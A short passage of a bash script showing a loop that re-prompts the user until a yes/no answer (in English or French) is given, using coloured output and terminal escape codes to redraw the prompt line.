   while [ "$re" != 'Y' ] && [ "$re" != 'y' ] && [ "$re" != 'Yes' ] && [ "$re" != 'YES' ] && [ "$re" != 'yes' ] && [ "$re" != 'N' ] && [ "$re" != 'n' ] && [ "$re" != 'No' ] && [ "$re" != 'NO' ] && [ "$re" != 'no' ] && [ "$re" != 'O' ] && [ "$re" != 'o' ] && [ "$re" != 'Oui' ] && [ "$re" != 'OUI' ] && [ "$re" != 'oui' ] && [ "$re" != "\n" ]
         do
           echo -n -e "$Red\r                 [+]$White Try again (${BGreen}Y${White})es or (${BGreen}N${White})o :$BGreen "
           read re
		   echo -en "\033[1A\033[2K"
   done
done 

